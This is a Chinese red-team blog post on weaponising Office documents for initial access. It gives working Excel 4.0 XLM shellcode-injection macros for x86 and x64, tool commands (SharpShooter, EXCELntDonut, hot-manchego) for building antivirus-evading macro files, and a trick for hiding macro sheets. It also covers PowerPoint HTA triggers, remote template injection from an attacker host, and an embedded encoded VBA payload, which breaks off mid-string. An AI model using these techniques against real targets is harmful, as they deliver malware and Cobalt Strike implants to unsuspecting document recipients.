@@ -1,0 +1,1476 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="禁止平庸！！！！  在团队内的分享，记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive Doc 笔记">
+<meta property="og:url" content="https://lengjibo.github.io/offendoc/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="禁止平庸！！！！  在团队内的分享，记录一下">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/16.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/17.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/18.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/19.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/20.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/21.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/22.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/offendoc/23.png">
+<meta property="og:updated_time" content="2021-01-31T07:56:59.439Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Offensive Doc 笔记">
+<meta name="twitter:description" content="禁止平庸！！！！  在团队内的分享，记录一下">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/offendoc/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/offendoc/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Offensive Doc 笔记 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/offendoc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Offensive Doc 笔记
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2021-01-31 15:39:28 / Updated at: 15:56:59" itemprop="dateCreated datePublished" datetime="2021-01-31T15:39:28+08:00">2021-01-31</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>禁止平庸！！！！</p>
+<hr>
+<p>在团队内的分享，记录一下</p>
+<a id="more"></a>
+<h2 id="一、XLM-Macro-Excel-4-0"><a href="#一、XLM-Macro-Excel-4-0" class="headerlink" title="一、XLM Macro(Excel 4.0)"></a>一、XLM Macro(Excel 4.0)</h2><p>与一般的office文档不同的是，其格式为XLM，不同于其他的XML，XLM被创建于1992年，比VBA还要早出很多。</p>
+<p><img src="../images/offendoc/0.png" alt="0.png"></p>
+<p>demo：</p>
+<p><img src="../images/offendoc/1.png" alt="0.png"></p>
+<p>这项技术在2018年，在这个文章中被指出：<a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/" target="_blank" rel="noopener">https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/</a></p>
+<p>由此也衍生出了很多的相关项目，比如(Excel4-DCOM：<a href="https://github.com/outflanknl/Excel4-DCOM)：" target="_blank" rel="noopener">https://github.com/outflanknl/Excel4-DCOM)：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Excel4DCOM -ComputerName server01 -Payload C:\temp\payload.bin</span><br></pre></td></tr></table></figure>
+<p>其也是依靠XLM的来调用win32API来实现远程线程注入：</p>
+<p><img src="../images/offendoc/2.png" alt="0.png"></p>
+<p>SharpShooter：<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a> 利用该工具创建XLS Macro的方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee</span><br></pre></td></tr></table></figure>
+<p>生成的SLK文件如下：</p>
+<p><img src="../images/offendoc/3.png" alt="0.png"></p>
+<p>原理基本类似。不过这种都是基于X86的，X64有一些问题，有一篇文章（<a href="https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits）" target="_blank" rel="noopener">https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits）</a> 介绍了该问题。</p>
+<p><img src="../images/offendoc/4.png" alt="0.png"></p>
+<p>最后衍生的工具：<a href="https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a" target="_blank" rel="noopener">https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a</a></p>
+<p>当然还有很多相关的工具（Macrome：<a href="https://github.com/michaelweber/Macrome、EXCELntDonut：https://github.com/FortyNorthSecurity/EXCELntDonut）" target="_blank" rel="noopener">https://github.com/michaelweber/Macrome、EXCELntDonut：https://github.com/FortyNorthSecurity/EXCELntDonut）</a> 等等。</p>
+<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><p>在XLS中支持win32的调用，也就意味着我们可以进行进程注入等操作。调用方式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REGISTER(module_name, procedure_name, type, alias, argument, macro_type, category)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/offendoc/5.png" alt="0.png"></p>
+<p>需要注意的是，区分x86与x64，x86的demo如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;VirtualAlloc&quot;,&quot;JJJJJ&quot;,&quot;Valloc&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;WriteProcessMemory&quot;,&quot;JJJCJJ&quot;,&quot;WProcessMemory&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;CreateThread&quot;,&quot;JJJJJJJ&quot;,&quot;CThread&quot;,,1,9)</span><br><span class="line">=Valloc(0,65536,4096,64)</span><br><span class="line">=SELECT(B1:B999,B1)</span><br><span class="line">=SET.VALUE(D1,0)</span><br><span class="line">=WHILE(ACTIVE.CELL()&lt;&gt;&quot;excel&quot;)</span><br><span class="line">=SET.VALUE(D2,LEN(ACTIVE.CELL()))</span><br><span class="line">=WProcessMemory(-1,A10+(D1*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)</span><br><span class="line">=SET.VALUE(D1,D1+1)</span><br><span class="line">=SELECT(,&quot;R[1]C&quot;)</span><br><span class="line">=NEXT()</span><br><span class="line">=CThread(0,0,A10,0,0,0)</span><br><span class="line">=HALT()</span><br></pre></td></tr></table></figure>
+<p>x64demo如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;VirtualAlloc&quot;,&quot;JJJJJ&quot;,&quot;Valloc&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;RtlCopyMemory&quot;,&quot;JJCJ&quot;,&quot;RTL&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;QueueUserAPC&quot;,&quot;JJJJ&quot;,&quot;Queue&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;ntdll&quot;,&quot;NtTestAlert&quot;,&quot;J&quot;,&quot;Go&quot;,,1,9)</span><br><span class="line">=WHILE(A22=0)</span><br><span class="line">=SET.VALUE(A22,Valloc(A21,65536,12288,64))</span><br><span class="line">=SET.VALUE(A21,A21+262144)</span><br><span class="line">=NEXT()</span><br><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;RtlCopyMemory&quot;,&quot;JJCJ&quot;,&quot;RTL&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;Kernel32&quot;,&quot;QueueUserAPC&quot;,&quot;JJJJ&quot;,&quot;Queue&quot;,,1,9)</span><br><span class="line">=REGISTER(&quot;ntdll&quot;,&quot;NtTestAlert&quot;,&quot;J&quot;,&quot;Go&quot;,,1,9)</span><br><span class="line">=SELECT(C1:C3479,C1)</span><br><span class="line">=SET.VALUE(D1,0)</span><br><span class="line">=WHILE(ACTIVE.CELL()&lt;&gt;&quot;EXCEL&quot;)</span><br><span class="line">=SET.VALUE(D2,LEN(ACTIVE.CELL()))</span><br><span class="line">=RTL(A22+(D1*10),ACTIVE.CELL(),LEN(ACTIVE.CELL()))</span><br><span class="line">=SET.VALUE(D1,D1+1)</span><br><span class="line">=SELECT(,&quot;R[1]C&quot;)</span><br><span class="line">=NEXT()</span><br><span class="line">=Queue(A22,-2,0)</span><br><span class="line">=Go()</span><br><span class="line">=SET.VALUE(A22,0)</span><br><span class="line">=HALT()</span><br></pre></td></tr></table></figure>
+<p>这里方便起见直接使用EXCELntDonut来生成。使用Cs生成shellcode，然后替换到指定位置：</p>
+<p><img src="../images/offendoc/6.png" alt="0.png"></p>
+<p>然后运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXCELntDonut -f exe_source.cs -r System.Windows.Forms.dll</span><br></pre></td></tr></table></figure>
+<p><img src="../images/offendoc/7.png" alt="0.png"></p>
+<p>然后将数据插入，并处理</p>
+<p><img src="../images/offendoc/8.png" alt="0.png"></p>
+<p><img src="../images/offendoc/9.png" alt="0.png"></p>
+<p>然后执行即可。可惜测试时一直失败。</p>
+<p><img src="../images/offendoc/10.png" alt="0.png"></p>
+<h3 id="Evasion"><a href="#Evasion" class="headerlink" title="Evasion"></a>Evasion</h3><h4 id="效果相等："><a href="#效果相等：" class="headerlink" title="效果相等："></a>效果相等：</h4><p><img src="../images/offendoc/11.png" alt="0.png"></p>
+<h4 id="宏隐藏"><a href="#宏隐藏" class="headerlink" title="宏隐藏"></a>宏隐藏</h4><p>（<a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-xls/b9ec509a-235d-424e-871d-f8e721106501）：" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-xls/b9ec509a-235d-424e-871d-f8e721106501）：</a></p>
+<p><img src="../images/offendoc/12.png" alt="0.png"></p>
+<p>即改成02</p>
+<p><img src="../images/offendoc/13.png" alt="0.png"></p>
+<p>此时已无法显示隐藏：</p>
+<p><img src="../images/offendoc/14.png" alt="0.png"></p>
+<h4 id="EPPLUS：EPPlus-5-Excel-spreadsheets-for-NET"><a href="#EPPLUS：EPPlus-5-Excel-spreadsheets-for-NET" class="headerlink" title="EPPLUS：EPPlus 5-Excel spreadsheets for .NET"></a>EPPLUS：EPPlus 5-Excel spreadsheets for .NET</h4><p>EPPLUS是一个用来生成Excel的.net库。<a href="https://github.com/EPPlusSoftware/EPPlus" target="_blank" rel="noopener">https://github.com/EPPlusSoftware/EPPlus</a></p>
+<p>利用该程序可以更改的免杀excel，demo：<a href="https://github.com/FortyNorthSecurity/hot-manchego" target="_blank" rel="noopener">https://github.com/FortyNorthSecurity/hot-manchego</a></p>
+<p>用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs</span><br><span class="line">hot-manchego.exe blank.xlsm vba.txt</span><br></pre></td></tr></table></figure>
+<p>执行宏，获取Cs会话。</p>
+<p><img src="../images/offendoc/15.png" alt="0.png"></p>
+<h2 id="二、powerpoint"><a href="#二、powerpoint" class="headerlink" title="二、powerpoint"></a>二、powerpoint</h2><p>这种攻击则利用的是鼠标轨迹来进行操作，比如鼠标点击、鼠标移动等。操作如下：</p>
+<p><img src="../images/offendoc/16.png" alt="0.png"></p>
+<p>插入Cs生成的hta文件。点击时，</p>
+<p><img src="../images/offendoc/17.png" alt="0.png"></p>
+<p>Cs上线。</p>
+<h2 id="三，远程加载文档"><a href="#三，远程加载文档" class="headerlink" title="三，远程加载文档"></a>三，远程加载文档</h2><p>每一个文档都是一个zip文件，解压，编辑</p>
+<p><img src="../images/offendoc/18.png" alt="0.png"></p>
+<p>修改为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id=&quot;rId3&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;http://192.168.1.106/1.dotm&quot; TargetMode=&quot;External&quot;/&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/offendoc/19.png" alt="0.png"></p>
+<p>此时打开文档，运行宏即可上线。</p>
+<h2 id="四，控件"><a href="#四，控件" class="headerlink" title="四，控件"></a>四，控件</h2><p>直接上代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Sub Main()</span><br><span class="line">On Error Resume Next</span><br><span class="line">createTextBoxs</span><br><span class="line">ExecuteTextBoxCommands</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub createTextBoxs()</span><br><span class="line">On Error Resume Next</span><br><span class="line">Dim objTextBox As Shape</span><br><span class="line">Dim secretkey As Long</span><br><span class="line">Dim str As String</span><br><span class="line">Dim zHf As String</span><br><span class="line">Dim payload As String</span><br><span class="line"></span><br><span class="line">payload = &quot;H4sIAAAAAAAAAK1WaW/iShb9nPwKf4gEKCQBs4U3ivQAYzDGxmA2kxdFZbuAMuWtvGDzpv/7lA2k09PpmZZmkJCr7LucOnepq8Lw&quot;</span><br><span class="line">payload = payload + &quot;QQ0JMkLJNSHzsIQkQK7DsLe328gxwmydLd53MHz3iGu8A9MkMAiYv29vFECAzRTvYkDebdeMMCwz+SYThGZEYOnm5vYmfxU5AdjC&quot;</span><br><span class="line">payload = payload + &quot;dweEKIbvNgz3rhkwL0zxteN5nGsD5Lz98UcvIgQ64Xn/OIBhJwigrWMEg2KJ+Sez2kMCHya6BY2Q+Zu5e38cYFcH+CKW9oCxp6fo&quot;</span><br><span class="line">payload = payload + &quot;OGb2bewaIDvBo+phFBYLf/1VKL0+VN8e+34EcFAsqGkQQvvRxLhQYr6VMofz1IPFgoQM4gbuNnxcIafGPi5y9HIOXjpjL5QuJ9t5&quot;</span><br><span class="line">payload = payload + &quot;gJ7j14fMrJ51igW6VCg3nTOHhTLzmvl7fXtj/vxAM4ucENnwUXBCSFxPhSRGBgweh8AxMZzBLVUrBDRmzq5QoiAIDCPiMFcsVC92&quot;</span><br><span class="line">payload = payload + &quot;D7B450QYl6nd19+1+1aU4fFK7u8qFT8rUSklJKXyJSd+hw4pz5uzOXqcn9B/Sq4S/f2UYKXbb1+lqgkx3IEQvoeU30+5entz85ov&quot;</span><br><span class="line">payload = payload + &quot;IT1PUXEDlOu9MJUyI1EQIHRJmoVzTiJYevsen7Pbq2ZQ/qWh6lXronMOzxnHC/O6dJH5dntTur1kT/b+XY8QNiHJvv+6Gji4RQ7k&quot;</span><br><span class="line">payload = payload + &quot;UgfYyLgmfPGrmMEthjkfj1cxmeIsFi4foMld2ClkhL7+rNa3Ufih2z2D6xg07gFFRVOi9COYcwyLBcGRoE35O+9pmt5taZnBq/Sl&quot;</span><br><span class="line">payload = payload + &quot;tNKr92yf5XIPgyAoM0pE69woMyoEGJplpuME6PKpE4Vuvix8hytFOEQGCMKrubfSF5ReXPdch1ZMZNDoUhrmqgcNBHDGSpkZIhN2&quot;</span><br><span class="line">payload = payload + &quot;UxXtrhAKX3LSAxjTkqOWYhoT+ibjQg2znCFm+d/zo/SowlCwPQxtKp13IR6DHe05l4rK0w3soFn4D7CvdXIuioyrK0mfQNMEULEb&quot;</span><br><span class="line">payload = payload + &quot;lpklIiHta4XyT4n3v8H7scX8ALNH4CWQxbwQhS1t6OcuQNkJ0Ik2Y+gzz6WsBF+7aZjVUm7GyK6blw+ic1pJSJV44tpdEMBmXc17&quot;</span><br><span class="line">payload = payload + &quot;XLFQY6Nd0lbGzVSyBHaUao6cGM6S9GN+AJr7ZMpGrjEPiT/sc3Q/M9ggwAPs6fuxD5KxZSXt3jrtKx12jJqogYRo3D05PDJsqjed&quot;</span><br><span class="line">payload = payload + &quot;uNqsTYRY5l0ctMQev1oAZPm5r8iuV80+SMcno7knExa62lH2hVjpmKvYaNqiyzdDqruM+pFH+tFE0aKxP7YFVN/H3DIcxcLgeSiy&quot;</span><br><span class="line">payload = payload + &quot;GnjGegvm+qaf+dL8XQyy/amd7ZHfgyTzo1H2Ya3ahKtRS3M8BFfR7nSUkWGeOMiO6PvIlQwvqMknY3s4WMCrLtRDVZwvNmvKTRX4&quot;</span><br><span class="line">payload = payload + &quot;hNebRNU8HC87i0NN2ZAcW8xTjHKGExns6KR5h4259Ps1RRcWQ0z8aITsp2kqpBcZe5Sqapc+xY0p+s8N88SmQ68OmgRRThPqp5Xx&quot;</span><br><span class="line">payload = payload + &quot;aywCS1hNHGPNI9vYs9zMMtp25Dco7vpQHonrhPjhiPgx9hsTxchw53qZ/LSOJ1Uq7+vWWAT3ApIs0D4FYxHG2TpVODFJBUt4jrqZ&quot;</span><br><span class="line">payload = payload + &quot;HjdIsL48WF61Dpsjh8XTNteWoCfaUjxTm7Mu6K6T+27aHyxUMx0kHW4trp86+nbnBq2DI3X1eijMOi2LsLzJpz01RYcnvD7E7Hij&quot;</span><br><span class="line">payload = payload + &quot;zPGgsmhMogrkYCqzi/5mxtmj/uxQXQ+mcjTnsTivtHtcV5P7R2k87SeTRWW0Vg+8MtvvON3p+pudBLiZpHVqMxoPU1ryHU5fGxw/&quot;</span><br><span class="line">payload = payload + &quot;raiDjlxbLLxhZu9sw41EVe6tZ5u+IE3WvV2j20Lb0xPeWa1D41CVN+0F2R21mWDp3hYE7BE1gHrfirzOXN427bm7ZTdNQYOVJQSg&quot;</span><br><span class="line">payload = payload + &quot;eqqAlup3dhOzJ676+/V4IdaaRnP69BwYadVSWEGdP8faUF7K4ux5GRw30ugETZ+7r7DcWtr5glLbhEHYqlYPykwTLHmkVO6TrZxU&quot;</span><br><span class="line">payload = payload + 